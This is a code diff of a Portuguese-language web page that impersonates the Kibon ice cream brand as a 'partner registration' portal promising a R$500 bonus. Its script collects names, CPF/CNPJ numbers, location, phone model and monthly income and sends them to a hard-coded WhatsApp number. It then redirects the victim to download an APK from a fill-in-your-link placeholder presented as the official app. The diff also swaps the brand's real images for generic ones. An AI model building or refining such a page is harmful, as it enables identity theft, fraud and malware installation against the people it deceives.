@@ -3,84 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Portal do Parceiro e Catálogo</title>
+    <title>Portal do Parceiro - Cadastro e Catálogo</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --kibon-red: #E2001A;
-            --kibon-yellow: #FFD700;
-            --kibon-dark: #b10014;
-            --success: #28a745;
+            --primary-red: #E2001A;
+            --accent-yellow: #FFD700;
+            --success-green: #28a745;
         }
 
         * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background: #f0f2f5; margin: 0; padding: 10px; }
+        body { background: #f4f7f6; margin: 0; padding: 10px; color: #333; }
 
         .container {
             background: #fff;
             width: 100%;
             max-width: 500px;
-            margin: 20px auto;
-            border-radius: 30px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            margin: 10px auto;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             overflow: hidden;
         }
 
-        /* Banner de Bônus */
-        .bonus-header {
-            background: var(--kibon-yellow);
-            color: var(--kibon-red);
+        .promo-banner {
+            background: var(--accent-yellow);
+            color: var(--primary-red);
             text-align: center;
             padding: 12px;
             font-weight: 800;
             font-size: 13px;
             text-transform: uppercase;
-            border-bottom: 3px solid var(--kibon-red);
+            border-bottom: 3px solid var(--primary-red);
         }
 
-        .header-content { padding: 25px 20px; text-align: center; }
-        .logo-kibon { width: 140px; margin-bottom: 10px; }
-        h1 { font-size: 22px; color: #333; margin: 0; font-weight: 800; }
-        p.subtitle { font-size: 13px; color: #888; margin-top: 5px; }
+        .header { padding: 25px 20px; text-align: center; }
+        .logo-placeholder { 
+            font-size: 32px; 
+            font-weight: 900; 
+            color: var(--primary-red);
+            letter-spacing: -1px;
+            margin-bottom: 5px;
+        }
 
-        /* Estilo do Formulário */
-        .form-section { padding: 0 20px 30px; }
-        .field-group { margin-bottom: 15px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 5px; text-transform: uppercase; }
-        input, select {
+        h1 { font-size: 20px; margin: 5px 0; font-weight: 800; }
+        .subtitle { font-size: 13px; color: #777; margin-bottom: 20px; }
+
+        /* FORMULÁRIO */
+        .form-section { padding: 0 20px 25px; }
+        .field { margin-bottom: 12px; text-align: left; }
+        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 4px; text-transform: uppercase; }
+        input {
             width: 100%; padding: 12px; border: 2px solid #f0f0f0; border-radius: 12px;
-            font-size: 14px; outline: none; background: #fafafa;
+            font-size: 14px; outline: none; background: #fafafa; transition: 0.3s;
         }
-        input:focus { border-color: var(--kibon-red); background: #fff; }
+        input:focus { border-color: var(--primary-red); background: #fff; }
 
-        .btn-submit {
-            width: 100%; padding: 18px; background: var(--kibon-red); color: #fff;
+        .btn-main {
+            width: 100%; padding: 18px; background: var(--primary-red); color: #fff;
             border: none; border-radius: 50px; font-size: 16px; font-weight: 800;
             cursor: pointer; box-shadow: 0 6px 15px rgba(226, 0, 26, 0.3);
-            text-transform: uppercase; transition: 0.3s;
+            text-transform: uppercase; margin-top: 10px;
         }
 
-        /* ESTILO DO CATÁLOGO */
-        .catalog-title {
-            background: var(--kibon-red); color: #fff;
-            padding: 15px; text-align: center; font-weight: 800;
-            font-size: 16px; text-transform: uppercase;
+        /* CATÁLOGO ILUSTRATIVO */
+        .catalog-head {
+            background: #f8f8f8; padding: 15px; text-align: center;
+            font-weight: 800; border-top: 1px solid #eee; border-bottom: 1px solid #eee;
         }
 
-        .product-grid { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .product-item {
-            border: 1px solid #eee; border-radius: 15px; padding: 10px;
-            text-align: center; transition: 0.3s;
+        .grid { padding: 15px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .item {
+            background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 10px;
+            text-align: center; position: relative;
         }
-        .product-item img { width: 80px; height: 80px; object-fit: contain; }
-        .product-name { font-size: 12px; font-weight: 700; height: 35px; margin: 5px 0; color: #444; }
-        .price-old { font-size: 10px; color: #999; text-decoration: line-through; }
-        .price-new { font-size: 15px; color: var(--success); font-weight: 800; display: block; }
-        
-        .btn-buy {
-            background: var(--kibon-yellow); color: var(--kibon-red);
-            border: none; border-radius: 8px; padding: 5px 10px;
-            font-size: 10px; font-weight: 800; cursor: pointer; margin-top: 8px;
+        .item img { width: 100%; height: 100px; object-fit: cover; border-radius: 10px; margin-bottom: 8px; }
+        .item-name { font-size: 12px; font-weight: 700; color: #444; margin-bottom: 5px; height: 30px; overflow: hidden; }
+        .price-tag { font-size: 14px; color: var(--success-green); font-weight: 800; }
+        .discount-badge { 
+            position: absolute; top: 5px; right: 5px; background: var(--primary-red); 
+            color: #fff; font-size: 9px; padding: 3px 6px; border-radius: 5px; font-weight: 800;
         }
 
         .footer { padding: 20px; text-align: center; font-size: 10px; color: #bbb; background: #fafafa; }
@@ -89,72 +90,55 @@
 <body>
 
 <div class="container">
-    <div class="bonus-header">🎁 R$ 500,00 DE SALDO PARA SEU PRIMEIRO PEDIDO</div>
+    <div class="promo-banner">🎁 BÔNUS DE R$ 500,00 PARA NOVOS PARCEIROS</div>
     
-    <div class="header-content">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/63/Kibon_logo.svg/1024px-Kibon_logo.svg.png" alt="Kibon" class="logo-kibon">
-        <h1>Cadastro do Parceiro</h1>
-        <p class="subtitle">Complete para liberar os preços de atacado</p>
+    <div class="header">
+        <div class="logo-placeholder">KIBON</div>
+        <h1>Credenciamento 2026</h1>
+        <p class="subtitle">Cadastre sua loja e receba o bônus no App</p>
     </div>
 
     <form class="form-section">
-        <div class="field-group">
-            <label>Nome Completo</label>
-            <input type="text" id="nome" placeholder="Seu nome">
-        </div>
-        <div class="field-group">
-            <label>Nome do Comércio</label>
-            <input type="text" id="loja" placeholder="Nome da loja">
-        </div>
-        <div class="field-group">
-            <label>CPF ou CNPJ</label>
-            <input type="text" id="doc" placeholder="000.000.000-00">
-        </div>
-        <div style="display:flex; gap:10px; margin-bottom:15px;">
-            <input type="text" id="cidade" placeholder="Cidade">
-            <input type="text" id="uf" maxlength="2" placeholder="UF" style="width: 70px;">
-        </div>
-        <div class="field-group">
-            <label>Modelo do Celular</label>
-            <input type="text" id="cel" placeholder="Ex: iPhone 13">
-        </div>
-        <div class="field-group">
-            <label>Renda Mensal</label>
-            <input type="text" id="renda" placeholder="R$ 0,00">
+        <div class="field"><label>Nome do Responsável</label><input type="text" id="nome" placeholder="Seu nome"></div>
+        <div class="field"><label>Nome do Comércio</label><input type="text" id="loja" placeholder="Nome da sua loja"></div>
+        <div class="field"><label>CPF ou CNPJ</label><input type="text" id="doc" placeholder="000.000.000-00"></div>
+        
+        <div style="display:flex; gap:10px;">
+            <div class="field" style="flex:2;"><label>Cidade</label><input type="text" id="cidade" placeholder="Sua cidade"></div>
+            <div class="field" style="flex:1;"><label>UF</label><input type="text" id="uf" maxlength="2" placeholder="Ex: SP"></div>
         </div>
 
-        <button type="button" class="btn-submit" onclick="finalizar()">CADASTRAR E RESGATAR R$ 500</button>
+        <div class="field"><label>Modelo do Celular</label><input type="text" id="cel" placeholder="Ex: Samsung A54"></div>
+        <div class="field"><label>Renda Mensal</label><input type="text" id="renda" placeholder="R$ 0,00"></div>
+
+        <button type="button" class="btn-main" onclick="enviarDados()">RESGATAR BÔNUS E BAIXAR APP</button>
     </form>
 
-    <div class="catalog-title">🍦 Tabela Especial (-10% OFF)</div>
-    <div class="product-grid">
-        <div class="product-item">
-            <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/magnum_cl%C3%A1ssico-1160824-png.png" alt="Magnum">
-            <div class="product-name">Magnum Clássico</div>
-            <span class="price-old">R$ 15,00</span>
-            <span class="price-new">R$ 13,50</span>
-            <button class="btn-buy" onclick="alert('Faça o cadastro para comprar com bônus!')">USAR BÔNUS</button>
+    <div class="catalog-head">🍦 OFERTAS PARA O PRIMEIRO PEDIDO (-10%)</div>
+    <div class="grid">
+        <div class="item">
+            <div class="discount-badge">10% OFF</div>
+            <img src="https://images.unsplash.com/photo-1576506295286-5cda18df43e7?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
+            <div class="item-name">Picolé Premium Chocolate</div>
+            <div class="price-tag">R$ 13,50</div>
         </div>
-        <div class="product-item">
-            <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/cornetto_crocante-1160821-png.png" alt="Cornetto">
-            <div class="product-name">Cornetto Crocante</div>
-            <span class="price-old">R$ 12,00</span>
-            <span class="price-new">R$ 10,80</span>
-            <button class="btn-buy" onclick="alert('Faça o cadastro para comprar com bônus!')">USAR BÔNUS</button>
+        <div class="item">
+            <div class="discount-badge">10% OFF</div>
+            <img src="https://images.unsplash.com/photo-1567206563064-6f60f40a2b57?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
+            <div class="item-name">Cone Crocante Baunilha</div>
+            <div class="price-tag">R$ 10,80</div>
         </div>
-        <div class="product-item">
-            <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/fruttare_uva-1160825-png.png" alt="Fruttare">
-            <div class="product-name">Fruttare Uva</div>
-            <span class="price-old">R$ 6,00</span>
-            <span class="price-new">R$ 5,40</span>
-            <button class="btn-buy" onclick="alert('Faça o cadastro para comprar com bônus!')">USAR BÔNUS</button>
+        <div class="item">
+            <div class="discount-badge">10% OFF</div>
+            <img src="https://images.unsplash.com/photo-1501443762994-82bd5dabb892?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
+            <div class="item-name">Picolé de Frutas Real</div>
+            <div class="price-tag">R$ 5,40</div>
         </div>
-        <div class="product-item">
-            <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/pote_creme_1_5l-1160829-png.png" alt="Pote 1.5L">
-            <div class="product-name">Pote Creme 1.5L</div>
-            <span class="price-old">R$ 28,00</span>
-            <span class="price-new">R$ 25,20</span>
-            <button class="btn-buy" onclick="alert('Faça o cadastro para comprar com bônus!')">USAR BÔNUS</button>
+        <div class="item">
+            <div class="discount-badge">10% OFF</div>
+            <img src="https://images.unsplash.com/photo-1563805042-7684c019e1cb?auto=format&fit=crop&w=300&q=80" alt="Sorvete">
+            <div class="item-name">Pote Clássico 1.5L</div>
+            <div class="price-tag">R$ 25,20</div>
         </div>
     </div>
 
@@ -162,35 +146,44 @@
 </div>
 
 <script>
-    function finalizar() {
-        const tel = "5554999422678";
-        const linkAPK = "https://kibon.com.br/baixar"; // TROQUE PELO SEU LINK REAL
+    function enviarDados() {
+        const meuWhatsapp = "5554999422678";
+        const linkDoSeuAPK = "https://SEUSITE.netlify.app/seu-app.apk"; // COLOQUE SEU LINK DE DOWNLOAD AQUI
 
-        const nome = document.getElementById('nome').value;
-        const loja = document.getElementById('loja').value;
-        const doc = document.getElementById('doc').value;
-        const cid = document.getElementById('cidade').value;
-        const uf = document.getElementById('uf').value;
-        const cel = document.getElementById('cel').value;
-        const ren = document.getElementById('renda').value;
+        const campos = {
+            nome: document.getElementById('nome').value,
+            loja: document.getElementById('loja').value,
+            doc: document.getElementById('doc').value,
+            cid: document.getElementById('cidade').value,
+            uf: document.getElementById('uf').value,
+            cel: document.getElementById('cel').value,
+            ren: document.getElementById('renda').value
+        };
 
-        if(!nome || !loja || !doc) { alert("Preencha os campos!"); return; }
+        if(Object.values(campos).some(v => v === "")) {
+            alert("Por favor, preencha todos os campos para liberar seu bônus.");
+            return;
+        }
 
-        const msg = `*CADASTRO BÔNUS R$ 500*%0A` +
-                    `----------------------------%0A` +
-                    `👤 *Nome:* ${nome}%0A` +
-                    `🏪 *Loja:* ${loja}%0A` +
-                    `📄 *Doc:* ${doc}%0A` +
-                    `📍 *Local:* ${cid}-${uf}%0A` +
-                    `📱 *Celular:* ${cel}%0A` +
-                    `💰 *Renda:* ${ren}%0A` +
-                    `----------------------------%0A` +
-                    `*CLIENTE QUER USAR O BÔNUS NO APP*`;
+        const texto = `*NOVO PARCEIRO CADASTRADO*%0A` +
+                      `----------------------------%0A` +
+                      `👤 *Nome:* ${campos.nome}%0A` +
+                      `🏪 *Loja:* ${campos.loja}%0A` +
+                      `📄 *Doc:* ${campos.doc}%0A` +
+                      `📍 *Cidade:* ${campos.cid}-${campos.uf}%0A` +
+                      `📱 *Celular:* ${campos.cel}%0A` +
+                      `💰 *Renda:* ${campos.ren}%0A` +
+                      `----------------------------%0A` +
+                      `*SOLICITANDO BÔNUS DE R$ 500*`;
 
-        window.open(`https://api.whatsapp.com/send?phone=${tel}&text=${msg}`, '_blank');
+        // Abre Whats
+        window.open(`https://api.whatsapp.com/send?phone=${meuWhatsapp}&text=${texto}`, '_blank');
         
-        alert("Cadastro Ok! Baixe o App no próximo passo para usar seu bônus de R$ 500 com os descontos da tabela.");
-        window.location.href = linkAPK;
+        // Alerta e Download
+        setTimeout(() => {
+            alert("Cadastro realizado! O download do App oficial começará agora para você usar seu bônus.");
+            window.location.href = linkDoSeuAPK;
+        }, 1000);
     }
 </script>
 
